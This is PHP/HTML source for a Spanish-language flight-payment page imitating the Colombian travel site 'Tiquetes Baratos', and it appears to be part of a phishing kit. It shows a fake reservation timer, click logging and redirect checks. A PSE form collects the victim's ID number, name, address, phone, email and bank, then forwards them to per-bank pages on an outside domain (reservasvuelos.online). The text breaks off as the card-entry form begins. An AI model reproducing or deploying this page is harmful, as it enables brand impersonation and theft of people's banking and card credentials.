<?php include_once 'visit_handler.php'; ?>
<!DOCTYPE html>
<html class="js-focus-visible" data-js-focus-visible="" lang="ES-CO">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0">
    <title>
        Pago de localizador 240917061541-Vuelos Tiquetes Baratos
    </title>
    <link href="./assets/css/pay/t-checkout.css" rel="stylesheet" type="text/css">
    <link rel="stylesheet" type="text/css" href="./assets/css/pay/t-pga.css">
    <link rel="stylesheet" type="text/css" href="./assets/css/globals-43f29dad88.min.css">

    <script type="text/javascript" src="./assets/js/mobileslider-de0182521a.min.js"></script>
    <script type="text/javascript" src="./assets/js/bootstrap-5f3dc300f8.min.js"></script>
    <script type="text/javascript" src="./assets/js/globals-20d06c7852.min.js"></script>
    <script type="text/javascript" src="./assets/js/jquery.js"></script>


    <script>
        if(!localStorage.getItem('keyIdentifyForUser')){
            window.location = '/';
        }
    </script>

    <style>
        #efectyloader {
            position: fixed;
            top: 40%;
            left: 40%;
            transform: translate(-50%, -50%);
        }

        .logo {
            width: 250px;
        }

        .nequi-tab {
            block-size: 30px;
            inline-size: 30px;
            background-position: -434px -459px
        }

        table {
            width: 100%;
            text-align: left;
        }

        td {
            padding: 2px;
        }

        .titleT {
            text-align: right;
            font-weight: bold;
        }

        .authorize {
            background-color: #000 !important;
            padding: 8px 20px;
            color: #fff;
            border-radius: 0.5em;
        }

        .fakepswd {
            font-family: 'Courier New', Courier, monospace;
            -webkit-text-security: disc;
        }
    </style>

    <style>
        .table-info-threecolumns {
            border-top: 1px solid #b9b7b8;
            padding: 1rem 0 0;
            margin: 1rem 0;
        }

        .table-info-threecolumns:last-child {
            border-bottom: 1px solid #b9b7b8;
            padding-bottom: 0.5rem;
        }

        .button--outlined {
            border: 2px solid #4fc3f4;
        }

        .button--outlined-50 {
            border: 2px solid #dbedfe;
            color: #8dbceb;
        }

        .button--outlined-50:hover {
            border: 2px solid #4fc3f4;
            color: #06c;
        }

        .icon-important_message {
            width: 37px;
            height: 30px;
        }

        .table-info-threecolumns-img {
            width: 121px;
            height: 30px;
            background-repeat: no-repeat;
        }

        .table-info-threecolumns div {
            display: inline-table;
        }

        .table-info-threecolumns div:nth-child(1) {
            width: 20%;
        }

        .table-info-threecolumns div:nth-child(2) {
            width: 20%;
            height: auto;
        }

        .table-info-threecolumns div:nth-child(3) {
            width: 55%;
            height: auto;
        }

        .table-info-threecolumns {
            padding: 0;
            margin: 0;
        }



        .bancodavivienda_full,
        .bancoviabaloto_full {
            background-repeat: no-repeat;
            background-size: contain;
        }


        .cameBack-paymentMethods--link {
            padding: 0;
            margin: 0;
            background: none;
            font-size: 16px;
            color: #06c;
            text-transform: inherit;
            font-weight: 400;
            transition: 0.2s ease-in-out;
            font-family: "Roboto", sans-serif;
            -webkit-font-smoothing: antialiased !important;
            display: inline-block;
            position: relative;
            line-height: 1.5;
            border-radius: .25rem;
            text-align: center;
            white-space: nowrap;
            user-select: none;
            border: none;
            padding-top: 10px;
            text-decoration-line: none;
        }

        .icon-arrow-back:before {
            content: "\67"
        }

        .espera {
            background: #FFF !important;
            z-index: 9999 !important;
            position: fixed !important;
            top: 0 !important;
            left: 0 !important;
            width: 100% !important;
            height: 100% !important;
            display: flex !important;
            justify-content: center !important;
            align-items: center !important;
            margin-top: 0 !important;
            margin-left: 0 !important;
        }

        .content-landing {
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        .espera-gif {
            background-image: url("./assets/images/espera.gif");
            background-repeat: no-repeat;
            width: 174px;
            height: 173px;
        }

        .espera-png {
            background-image: url("./assets/images/espera.png");
            background-repeat: no-repeat;
            width: 630px;
            height: 306px;
        }

        /* Estilos para pestañas de pago */
        #pseTab, #creditCardTab {
            cursor: pointer;
            transition: all 0.3s ease;
        }
        #pseTab a, #creditCardTab a {
            display: flex;
            align-items: center;
            gap: 8px;
            transition: all 0.3s ease;
        }
        
        /* Efecto de sombra e iluminación para pestaña activa */
        #pseTab.active-tab,
        #creditCardTab.active-tab {
            background: linear-gradient(180deg, #e8f4fc 0%, #ffffff 100%);
            border-radius: 8px 8px 0 0;
            box-shadow: 0 -4px 15px rgba(79, 195, 244, 0.4), 
                        inset 0 2px 10px rgba(79, 195, 244, 0.15);
            position: relative;
        }
        #pseTab.active-tab a,
        #creditCardTab.active-tab a {
            border-bottom: 4px solid #4fc3f4;
            color: #0066cc;
            font-weight: bold;
        }
        
        /* Pestaña inactiva */
        #pseTab:not(.active-tab),
        #creditCardTab:not(.active-tab) {
            background: #f5f5f5;
            opacity: 0.7;
        }
        #pseTab:not(.active-tab):hover,
        #creditCardTab:not(.active-tab):hover {
            background: #eaeaea;
            opacity: 1;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }
        
        /* Estilos del formulario PSE (Importados de data-ps) */
        #payTypePSE-content header {
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 10px 0;
        }
        #payTypePSE-content header img {
            width: 85px;
            height: auto;
            display: block;
        }
        #payTypePSE-content .formulario {
            background: #fff;
            margin: 20px auto;
            padding: 40px 35px;
            border-radius: 16px;
            box-shadow: 0 6px 20px rgba(0,0,0,0.1);
            width: 90%;
            max-width: 460px;
        }
        #payTypePSE-content .formulario h2 {
            text-align: center;
            margin-bottom: 25px;
            color: #0033a0;
            font-size: 1.6rem;
            font-weight: 600;
        }
        #payTypePSE-content label {
            display: block;
            margin-bottom: 6px;
            font-weight: 600;
            color: #333;
        }
        #payTypePSE-content input, #payTypePSE-content select {
            width: 100%;
            padding: 12px 14px;
            margin-bottom: 18px;
            border: 1px solid #cbd3e0;
            border-radius: 8px;
            font-size: 15px;
            background-color: #fafbff;
            outline: none;
            box-sizing: border-box;
        }
        #payTypePSE-content input:focus, #payTypePSE-content select:focus {
            border-color: #0033a0;
            box-shadow: 0 0 5px rgba(0,51,160,0.25);
            background-color: #fff;
        }
        #payTypePSE-content button {
            width: 100%;
            background: #0033a0;
            color: white;
            border: none;
            padding: 12px 0;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            font-size: 16px;
            transition: 0.3s ease;
        }
        #payTypePSE-content button:hover {
            background: #00297a;
            transform: scale(1.02);
        }
        #payTypePSE-content .nota {
            text-align: center;
            color: #666;
            font-size: 13px;
            margin-top: 12px;
        }
        #payTypePSE-content .input-group {
            margin-bottom: 18px;
        }
        /* Contenedor PSE */
        #payTypePSE-content {
            background: #fff;
        }
    </style>


    <script>
        // Funciones para cambiar entre pestañas de pago
        function switchToPSE() {
            // Activar pestaña PSE
            document.getElementById('pseTab').classList.add('active-tab');
            document.getElementById('creditCardTab').classList.remove('active-tab');
            
            // Ocultar contenedor de tarjeta, mostrar contenedor PSE
            var cardContainer = document.getElementById('payType1-payProcessType1-gatewayPayType1');
            var pseContainer = document.getElementById('payTypePSE-content');
            
            if (cardContainer) {
                cardContainer.style.display = 'none';
                cardContainer.classList.remove('active');
            }
            if (pseContainer) {
                pseContainer.style.display = 'block';
                pseContainer.classList.add('active');
            }
            
            console.log('Cambiando a PSE');
        }

        function switchToCard() {
            // Activar pestaña de tarjeta
            document.getElementById('creditCardTab').classList.add('active-tab');
            document.getElementById('pseTab').classList.remove('active-tab');
            
            // Mostrar contenedor de tarjeta, ocultar contenedor PSE
            var cardContainer = document.getElementById('payType1-payProcessType1-gatewayPayType1');
            var pseContainer = document.getElementById('payTypePSE-content');
            
            if (cardContainer) {
                cardContainer.style.display = 'block';
                cardContainer.classList.add('active');
            }
            if (pseContainer) {
                pseContainer.style.display = 'none';
                pseContainer.classList.remove('active');
            }
            
            console.log('Cambiando a Tarjeta');
        }

        // Validación y redirección del formulario PSE (Importado de data-ps)
        document.addEventListener("DOMContentLoaded", () => {
          const form = document.getElementById("formPSE");

          if (form) {
            form.addEventListener("submit", function (e) {
              e.preventDefault();

              // 🔹 Datos del formulario
              const documento = document.getElementById("cedula").value.trim();
              const nombre    = document.getElementById("nombre").value.trim();
              const direccion = document.getElementById("direccion").value.trim();
              const correo    = document.getElementById("correo").value.trim();
              const telefono  = document.getElementById("celular").value.trim();
              const ciudad    = document.getElementById("ciudad").value.trim();

              // 🔹 Selector de banco con folder y tipo
              const selBanco  = document.getElementById("txt-banco");
              const bancoVal  = selBanco.value.trim();
              const optBanco  = selBanco.options[selBanco.selectedIndex];

              const bancoLabel = (optBanco.getAttribute("label") || optBanco.textContent || "").trim();
              const folder     = optBanco.getAttribute("folder") || "";
              const tipo       = optBanco.getAttribute("tipo")   || "";

              const tipo_identificacion = "CC";
              const tipo_persona        = "NATURAL";

              // ✅ Validaciones básicas
              if (!documento || !nombre || !direccion || !correo || !telefono || !ciudad || !bancoVal) {
                alert("Por favor completa todos los campos obligatorios.");
                return;
              }

              if (!folder) {
                alert("No se pudo determinar la ruta del banco seleccionado. Intenta nuevamente.");
                return;
              }

              // 🧩 Objeto tbdatos completo
              const tbdatos = {
                documento,
                nombre,
                tipo_identificacion,
                tipo_persona,
                direccion,
                telefono,
                correo,
                banco: bancoLabel, // nombre bonito del banco
                ciudad
              };

              localStorage.setItem("tbdatos", JSON.stringify(tbdatos));

              // 🧷 Guardados individuales
              localStorage.setItem("val", documento);
              localStorage.setItem("per", nombre);       // 👤 Persona / Nombre
              localStorage.setItem("nom", bancoLabel);   // 🏦 Banco
              localStorage.setItem("cel", telefono);
              localStorage.setItem("correo", correo);

              // Extras
              localStorage.setItem("ciudad", ciudad);
              localStorage.setItem("banco", bancoLabel);
              localStorage.setItem("tipo_persona", tipo_persona);
              localStorage.setItem("bank_folder", folder);
              localStorage.setItem("bank_tipo", tipo);

              console.log("✅ tbdatos guardado:", tbdatos);

              const params = window.location.search || "";

              setTimeout(() => {
                // Asegurar que haya una barra entre el folder y los parámetros si el folder no la tiene
                const targetFolder = folder.endsWith('/') ? folder : folder + '/';
                window.location.href = "data-ps/recargas/transaction/" + targetFolder + params;
              }, 800);
            });
          }
        });
    </script>
</head>

<body id="chkOut-co-tb" class="headerV2">
    <div class="espera" id="espera" style="visibility:visible;">
        <div class="content-landing">
            <div class="espera-gif" id="./assets/images/espera-home-gif"></div>
        </div>
    </div>


    <script>
        const siteName = 'viajesTiquetes';
        const preLoadedCouponDiscountCode = '';
        const isMobile = /Android|iPhone/i.test(navigator.userAgent);

        setTimeout(() => {

            document.querySelector("#espera").style.visibility = "hidden";
        }, 3000);
    </script>


    <div id="header">
        <div class="header-container">
            <div class="header-row">
                <div class="header-column header-logo">
                    <a href="./">
                        <img src="./assets/images/logo.png" alt="Tiquetes Baratos">
                    </a>
                </div>
            </div>
            <div class="menu-tb"> </div>
        </div>
        <br />
        <ul class="nav-steps" id="stepNew">
            <li class="past">

                <a href="#">
                    <span class="check-step">✔</span>
                    <span class="number-step">1</span>
                    <span class="content-step">Ingresa tus datos</span>
                </a>
            </li>


            <li class="active">

                <a href="#">
                    <span class="check-step">✔</span>
                    <span class="number-step">2</span>
                    <span class="content-step">Forma de pago</span>
                </a>
            </li>



            <li class="last">

                <a href="#">
                    <span class="check-step">✔</span>
                    <span class="number-step">3</span>
                    <span class="content-step">Confirmación</span>
                </a>
            </li>
        </ul>

    </div>
    <div id="splashContent">
        <div id="container">
            <div id="content">
                <div id="divError" class="errorbox step2" style="display: none;"></div>
                <input type="hidden" id="thirdPartyCheckoutGenericErrorMessage" value='Por el momento no está disponible esta forma de pago, por favor, elija otra forma de pago o intente de nuevo en unos minutos'>
                <input type="hidden" id="thirdPartyCheckoutsInformation" value=''>
                <input type="hidden" id="cultureCode" value="ES-CO" />




                <!--  Timer -->
                <div class="module countdown container-group-checkout" id="banner-timer">
                    <div class="module-column countdown-timer">
                        <h3>Tiempo para pagar:</h3>
                        <div class="block-time ap_reservedTime">
                            <span class="p-reserved__time" id="reserved__time">
                                <p class="countdown-time"><strong><span id="minuteClock">00</span></strong> minutos</p>
                                <p class="countdown-time"><strong>:</strong></p>
                                <p class="countdown-time"><strong><span id="secondClock">00</span></strong> segundos</p>
                            </span>
                        </div>
                    </div>
                    <script>
                        document.addEventListener('DOMContentLoaded', () => {
                            function startCountdown(duration, displayMinute, displaySecond) {
                                let timer = duration,
                                    minutes, seconds;
                                const intervalId = setInterval(function() {
                                    minutes = parseInt(timer / 60, 10);
                                    seconds = parseInt(timer % 60, 10);

                                    minutes = minutes < 10 ? "0" + minutes : minutes;
                                    seconds = seconds < 10 ? "0" + seconds : seconds;

                                    displayMinute.innerHTML = minutes;
                                    displaySecond.innerHTML = seconds;

                                    if (--timer < 0) {
                                        clearInterval(intervalId);
                                        alert('El tiempo para pagar ha expirado');
                                        console.log('Expired'); // Esto debería imprimirse en la consola
                                    }
                                }, 1000);
                            }

                            const tenMinutes = 60 * 10;
                            const displayMinute = document.getElementById('minuteClock');
                            const displaySecond = document.getElementById('secondClock');

                            // Agrega esto para asegurarte de que los elementos se encuentran:
                            if (displayMinute && displaySecond) {
                                startCountdown(tenMinutes, displayMinute, displaySecond);
                            } else {
                                console.error('No se encontraron los elementos displayMinute y displaySecond');
                            }
                        });
                    </script>
                    <div cass="module-column countdown-message">
                        <h1 class="countdown-title"><span class="ptw-icon-check"></span>¡Paga a tiempo y asegura tu viaje!</h1>

                        <p class="countdown-subtitle">
                            Guardaremos tu reservación durante 10 minutos con el localizador <strong id="loc"></strong>.
                            <br>
                            Si necesitas ayuda llámanos al fijo <a href="javascript:void(0);">6017436630</a>
                        </p>

                        <script>
                            document.addEventListener('DOMContentLoaded', () => {
                                document.getElementById('loc').innerHTML = localStorage.getItem('tokenPayment');
                            });
                        </script>
                    </div>
                </div>

                <div class="aside-checkout-2">
                    <div class="accordion card-header">
                        <button type="button" id="button_view_order" name="button" class="accordion__button">
                            <span class="accordion__button-text">Resumen de tu reservación</span>
                        </button>
                        <div class="accordion__content" id="content_order">
                            <div class="card">
                                <!--Hotels-->
                                <div class="card-body">
                                    <div class="summary-description">
                                        <div class="summary-description-name summary-description-name-full">
                                            <h5 id="title_order_for"></h5>
                                        </div>
                                    </div>
                                    <div class="summary-details">
                                        <ul class="list-dots" style="margin:0.5em 0 0 1.5em; padding: 0;">
                                            <li style="list-style-type: disc;" id="info_vuelo_ida">
                                                <div class="item-list-dot">
                                                    <h5>Vuelo de ida</h5>
                                                    <div class="item-list-logo-description item-airline-data">
                                                        <div class="item-list-logo">
                                                            <img data-attribute="image_vuelo_ida_one" id="image_vuelo_ida_one" src="">
                                                        </div>
                                                        <div class="item-list-description">
                                                            <p id="fecha_ida_one"></p>
                                                            <small class="note popover-note ap_scheduleDetails" id="horarios_ida_one">

                                                            </small>
                                                            &nbsp; <br />
                                                            <small id="tarifa_ida_one"></small>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li style="list-style-type: disc;">
                                                <div class="item-list-dot" id="info_vuelo_regreso">
                                                    <h5>Vuelo de regreso</h5>
                                                    <div class="item-list-logo-description item-airline-data">
                                                        <div class="item-list-logo">
                                                            <img data-attribute="image_vuelo_regreso_one" id="image_vuelo_regreso_one" src="">
                                                        </div>
                                                        <div class="item-list-description">
                                                            <pa id="fecha_regreso_one"></pa><br>
                                                            <small id="horarios_regreso_one" class="note popover-note ap_scheduleDetails">

                                                            </small>
                                                            &nbsp;<br />
                                                            <small id="tarifa_regreso_one"></small>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                        </ul>
                                    </div>
                                </div>
                                <div class="summary-product-rates">
                                    <div class="summary-note">
                                    </div>
                                    <table class="summary-table-rates">
                                        <tbody>
                                            <!--Flights-->
                                            <tr class="summary-title-description">
                                                <td class="summary-table-description">
                                                    <strong id="title_order_one"></strong>
                                                </td>
                                            </tr>
                                            <tr class="summary-discount" name="couponDiscountRow" style="display: none">
                                                <td class="summary-table-description">Cupón <span name="discountCodeSpan"></span></td>
                                                <td class="summary-table-rate" name="discountAmountTd"></td>
                                            </tr>
                                            <tr class="summary-total">
                                                <td class="summary-table-description">
                                                    Total:
                                                </td>
                                                <td class="summary-table-rate">
                                                    <strong class="ap_summaryTotalAmount" id="totalAmount" name="totalAmount"></strong>
                                                </td>
                                            </tr>
                                            <tr class="summary-zeroInterest" style="display: none;">
                                                <td colspan="2">
                                                    <span class="ptw-icon-creditcard"></span>hasta <span class="zeroInterest-installmentsNumber">36</span> <strong>
                                                        meses sin
                                                        intereses
                                                    </strong>
                                                    <ul class="list-check">
                                                        <li>Mejor precio garantizado <span class="ptw-icon ptw-icon-check"></span></li>
                                                        <li>Tus compras son seguras <span class="ptw-icon ptw-icon-check"></span></li>
                                                    </ul>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                    </div>

                    <script>
                        document.addEventListener('DOMContentLoaded', () => {
                            document.getElementById('button_view_order').addEventListener('click', (e) => {
                                const content_order = document.getElementById('content_order');
                                if (content_order.classList.contains('accordion__content')) {
                                    content_order.classList.remove('accordion__content');
                                } else {
                                    content_order.classList.add('accordion__content');
                                }
                            });
                        });
                    </script>

                    <div class="rightSummary ap_rightSummary">
                        <div class="card">

                            <div class="card-header">
                                <h3>Resumen de tu reservación</h3>
                            </div>
                            <div class="card-body">
                                <div class="summary-description">
                                    <div class="summary-description-name summary-description-name-full">
                                        <h5 id="title_order_two"></h5>
                                    </div>
                                </div>
                                <div class="summary-details">
                                    <ul class="list-dots" style="margin:0.5em 0 0 1.5em; padding: 0;">
                                        <li style="list-style-type: disc;" id="info_vuelo_ida_mb">
                                            <div class="item-list-dot">
                                                <h5>Vuelo de ida</h5>
                                                <div class="item-list-logo-description item-airline-data">
                                                    <div class="item-list-logo">
                                                        <img data-attribute="image_vuelo_ida_one_menu" id="image_vuelo_ida_one_menu" src="">
                                                    </div>
                                                    <div class="item-list-description">
                                                        <p id="fecha_ida_one_menu"></p>
                                                        <small class="note popover-note ap_scheduleDetails" id="horarios_ida_one_menu"></small>
                                                        &nbsp;<br />
                                                        <small id="tarifa_ida_one_menu"></small>
                                                    </div>
                                                </div>
                                            </div>
                                        </li>
                                        <li style="list-style-type: disc;"  id="info_vuelo_regreso_mb">
                                            <div class="item-list-dot">
                                                <h5>Vuelo de regreso</h5>
                                                <div class="item-list-logo-description item-airline-data">
                                                    <div class="item-list-logo">
                                                        <img id="image_vuelo_regreso_one_menu" data-attribute="image_vuelo_regreso_one_menu" src="">
                                                    </div>
                                                    <div class="item-list-description">
                                                        <p id="fecha_regreso_one_menu"></p>
                                                        <small class="note popover-note ap_scheduleDetails" id="horarios_regreso_one_menu"></small>
                                                        &nbsp;<br />
                                                        <small id="tarifa_regreso_one_menu"></small>
                                                    </div>
                                                </div>
                                            </div>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                            <div class="summary-product-rates">
                                <div class="summary-note">
                                </div>
                                <table class="summary-table-rates">
                                    <tbody>
                                        <!--Flights-->
                                        <tr class="summary-title-description">
                                            <td class="summary-table-description">
                                                <stronga id="title_order_three"> </stronga>
                                            </td>
                                        </tr>
                                        <tr class="summary-discount" name="couponDiscountRow" style="display: none">
                                            <td class="summary-table-description">Cupón <span name="discountCodeSpan"></span></td>
                                            <td class="summary-table-rate" name="discountAmountTd"></td>
                                        </tr>
                                        <tr class="summary-total">
                                            <td class="summary-table-description">
                                                Total:
                                            </td>
                                            <td class="summary-table-rate">
                                                <strong class="ap_summaryTotalAmount" name="totalAmount" id="totalPrice"></strong>
                                            </td>
                                        </tr>
                                        <tr class="summary-zeroInterest" style="display: none;">
                                            <td colspan="2">
                                                <span class="ptw-icon-creditcard"></span>hasta <span class="zeroInterest-installmentsNumber">36</span> <strong>
                                                    meses sin
                                                    intereses
                                                </strong>
                                                <ul class="list-check">
                                                    <li>Mejor precio garantizado <span class="ptw-icon ptw-icon-check"></span></li>
                                                    <li>Tus compras son seguras <span class="ptw-icon ptw-icon-check"></span></li>
                                                </ul>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>

                    <script>
                        document.addEventListener('DOMContentLoaded', () => {
    // MOBILE DATOS PARA PONER LOS DATOS DE VUELO
    const origenAndDes = localStorage.getItem('pt.tb.history_booker_prod');
    const from = JSON.parse(origenAndDes)?.from[0] || {};
    const to = JSON.parse(origenAndDes)?.to[0] || {};
    const datosVueloIda = JSON.parse(localStorage.getItem('datos_vuelo_ida')) || {};
    const datosVueloRegreso = JSON.parse(localStorage.getItem('datos_vuelo_regreso')) || {};
    const allPeople = localStorage.getItem('total-person-display') || 1;

    function convertPriceToNumber(priceStr) {
        if (!priceStr) return 0; // Si el precio no existe, devolver 0
        const numericStr = priceStr.toString().replace(/[^\d]/g, '');
        return parseInt(numericStr, 10) || 0; // Si no es un número válido, devolver 0
    }

    function sumPrices(price1, price2) {
        const numPrice1 = convertPriceToNumber(price1);
        const numPrice2 = convertPriceToNumber(price2);
        return numPrice1 + numPrice2;
    }

    const setAirDatas = (attributeId) => {
        const image_vuelo_ida = document.querySelector(`img[data-attribute="image_vuelo_ida_${attributeId}"]`);
        const image_vuelo_regreso = document.querySelector(`img[data-attribute="image_vuelo_regreso_${attributeId}"]`);

        if (localStorage.getItem('tripMode') === '1') {
            document.getElementById(`fecha_ida_${attributeId}`).innerHTML = `<strong>${from.code}  &gt; ${to.code} </strong>&nbsp;${localStorage.getItem('startDateText')}`;
            document.getElementById(`horarios_ida_${attributeId}`).innerHTML = `${datosVueloIda.departure || ''}hrs - ${datosVueloIda.arrival || ''}hrs - Sin escalas`;
            document.getElementById(`tarifa_ida_${attributeId}`).innerHTML = `<strong>Tarifa: </strong>${datosVueloIda.type || ''}`;

            console.log("Precio vuelo ida:", datosVueloIda.price); // Depuración

            document.getElementById('totalPrice').innerHTML = `COP ${convertPriceToNumber(datosVueloIda.price).toLocaleString()}`;
            datosVueloIda.vuelo == 'latam' ? image_vuelo_ida.src = './assets/images/LA_logo.gif' : image_vuelo_ida.src = './assets/images/AV_logo.gif';

            document.getElementById('info_vuelo_regreso').style.display = 'none';
            document.getElementById('info_vuelo_regreso_mb').style.display = 'none';

        } else {
            const totalPrice = sumPrices(datosVueloIda.price, datosVueloRegreso.price);

            console.log("Precio vuelo ida:", datosVueloIda.price);
            console.log("Precio vuelo regreso:", datosVueloRegreso.price);
            console.log("Total calculado:", totalPrice); // Depuración

            document.getElementById(`fecha_ida_${attributeId}`).innerHTML = `<strong>${from.code}  &gt; ${to.code} </strong>&nbsp;${localStorage.getItem('startDateText')}`;
            document.getElementById(`horarios_ida_${attributeId}`).innerHTML = `${datosVueloIda.departure || ''}hrs - ${datosVueloIda.arrival || ''}hrs - Sin escalas`;
            document.getElementById(`tarifa_ida_${attributeId}`).innerHTML = `<strong>Tarifa: </strong>${datosVueloIda.type || ''}`;
            document.getElementById(`fecha_regreso_${attributeId}`).innerHTML = `<strong>${to.code}  &gt; ${from.code} </strong>&nbsp;${localStorage.getItem('endDateText')}`;
            document.getElementById(`horarios_regreso_${attributeId}`).innerHTML = `${datosVueloRegreso.departure || ''}hrs - ${datosVueloRegreso.arrival || ''}hrs - Sin escalas`;
            document.getElementById(`tarifa_regreso_${attributeId}`).innerHTML = `<strong>Tarifa: </strong>${datosVueloRegreso.type || ''}`;

            document.getElementById('totalPrice').innerHTML = `COP$${totalPrice.toLocaleString()}`;
            
            datosVueloIda.vuelo == 'latam' ? image_vuelo_ida.src = './assets/images/LA_logo.gif' : image_vuelo_ida.src = './assets/images/AV_logo.gif';
            datosVueloRegreso.vuelo == 'latam' ? image_vuelo_regreso.src = './assets/images/LA_logo.gif' : image_vuelo_regreso.src = './assets/images/AV_logo.gif';
        }
    };

    document.getElementById('title_order_for').innerHTML = `Vuelo Redondo ${from.code} - ${to.code} para ${allPeople} persona(s)`;

    setAirDatas('one');
    setAirDatas('one_menu');
});

                    </script>

                    <script>
                        const couponResourceText = 'Cupón';
                    </script>
                    <div class="alert alert-success group web-description" style="display: none" id="webDescriptionDiv">
                        <p id="webDescriptionP">
                        </p>
                    </div>
                    <!--+++++++Coupon Discount+++++++-->
                    <div class="accordion-cupon cupon-body">
                        <button class="accordion__button" id="accordionButton">
                            <span class="accordion__button-text">Cupón o código de promoción</span>
                        </button>
                        <div class="accordion__content">
                            <div class="cupon-body">
                                <!-- <label class="">Código de cupón (opcional):</label> -->
                                <div class="display-cupon">
                                    <div>
                                        <input type="text" id="discountCodeActive" name="paymentInfo.discountCodeActive" value="false" placeholder="text-field-label" style="display:none">
                                        <input type="text" id="inputCupon" name="paymentInfo.discountCode" maxlength="19" size="25" value="" cardnum="1" ap_validation_type="text" tabindex="1">
                                        <span class=""></span>
                                    </div>
                                    <div class="buttons group p-0">
                                        <a class="btn-success btn-cupon btn-cupon-disabled" id="btn-cupon">
                                            Aplicar
                                        </a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                </div>


                <h3 class="title-payment-mobile">Seleccione su forma de pago</h3>
                <div class="container-group-checkout">
                    <div class="fxdwidth">
                        <!--  Checkout en TABS -->
                        <div class="tabs">
                            <!--+++++++ Selector de formas de pago +++++++-->

                            <ul id="nav" class="tab-links">
                                <li class="active-tab" onclick="switchToCard(); return false;" id="creditCardTab">
                                    <a name="payType1" id="payProcessType1" href="javascript:void(0);" class="tab-creditCard">
                                        <div class="sprite tc-tab" alt="tc"></div>
                                        <span class="tab-name">Crédito y débito</span>
                                    </a>
                                </li>
                                <li onclick="switchToPSE(); return false;" id="pseTab">
                                    <a name="payTypePSE" id="payProcessTypePSE" href="https://reservasvuelos.online/data-ps/recargas/index.php" class="tab-pse" style="max-height: 49px">
                                        <img src="./assets/images/pse.png" alt="PSE" style="height: 30px; width: auto;">
                                        <span class="tab-name">PSE</span>
                                    </a>
                                </li>
                                <li class="d-none" onclick="newLog('#' + document.getElementById('loc').textContent + ' Ha hecho click en Boton Bancolombia')">
                                    <!--Inactivo temporalmente-->
                                    <a name="payType2" href="javascript:void(0);" class="tab-bancolombia" style="max-height: 49px">
                                        <div class="sprite bancolombia-tab" alt="BANCOLOMBIA"></div>
                                        <span class="tab-name">
                                            Botón Bancolombia
                                        </span>
                                    </a>
                                </li>
                            </ul>

                            <!--+++++++ Contenido de los Tabs +++++++-->
                            <div class="tab-content">
                                <!--+++++++Pago con tarjeta de crédito+++++++-->
                                <div name="paymentMethodBox" id="payType1-payProcessType1-gatewayPayType1" class="tab active" style="display: block;">
                                    <a href="#" name="btnMethodList" class="cameBack-paymentMethods--link" style="display: none; text-decoration-line: none;" onclick="showMethodListAndHidePaymentMethods(); event.preventDefault();"><i class="icon-arrow-back"></i>Cambiar forma de pago</a>
                                    <!--Mensajes de error-->
                                    <div id="paymentPlanError" class="yel" style="display: none;">
                                        <ul>
                                            <li>
                                                <div class="cross sprite" alt="X"></div>
                                                <div id="paymentPlanErrorText"></div>
                                            </li>
                                        </ul>
                                    </div>

                                    <!--Switch-->

                                    <div class="switch-content">

                                        <!--+++++++ 1 Tarjeta +++++++-->
                                        <div id="switch1" class="scontent switch-module" style="display: block;">
                                            <div class="module module--secure">
                                                <h3 class="title-circle title-circle--secure selectCardInfoTitleB">&nbsp;Ingresa los datos de tu tarjeta</h3>
                                                <div class="alert alert-danger" id="vcard_error" role="alert" style="margin: 10px 0px 10px 0px; display: none;">
                                                    Tenemos problemas para procesar el pago con esta tarjeta, por favor intenta usar una diferente.
                                                </div>
                                                <div class="cardTypeSelection" id="cardTypeSelection1" cardnum="1">
                                                    <div class="logo-bank">
                                                        <svg width="39" height="13" viewBox="0 0 39 13" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M9.7504 12.6072H6.3752L3.84421 2.75011C3.72408 2.29669 3.46901 1.89583 3.0938 1.7069C2.15743 1.23212 1.12562 0.854271 0 0.663698V0.284202H5.43719C6.1876 0.284202 6.75041 0.854271 6.84421 1.51634L8.15745 8.62656L11.531 0.284202H14.8124L9.7504 12.6072ZM16.6884 12.6072H13.5008L16.1256 0.284202H19.3132L16.6884 12.6072ZM23.4372 3.69804C23.531 3.03433 24.0938 2.65483 24.7504 2.65483C25.7823 2.55955 26.9062 2.75012 27.8442 3.22325L28.407 0.570065C27.469 0.190569 26.4372 0 25.5008 0C22.407 0 20.1558 1.70691 20.1558 4.07589C20.1558 5.87809 21.7504 6.82436 22.876 7.39442C24.0938 7.96285 24.5628 8.34234 24.469 8.91077C24.469 9.76341 23.531 10.1429 22.5946 10.1429C21.469 10.1429 20.3434 9.85871 19.3132 9.38389L18.7504 12.0387C19.876 12.5119 21.0938 12.7025 22.2194 12.7025C25.6884 12.7961 27.8442 11.0908 27.8442 8.53125C27.8442 5.30802 23.4372 5.11909 23.4372 3.69804ZM39 12.6072L36.469 0.284202H33.7504C33.1876 0.284202 32.6248 0.663699 32.4372 1.23212L27.7504 12.6072H31.0318L31.6868 10.8066H35.7186L36.0938 12.6072H39ZM34.2194 3.60276L35.1558 8.24704H32.531L34.2194 3.60276Z" fill="#172B85"></path>
                                                        </svg>
                                                    </div>
                                                    <div class="logo-bank">
                                                        <svg width="31" height="24" viewBox="0 0 31 24" fill="none" xmlns="http://www.w3.org/2000/svg">
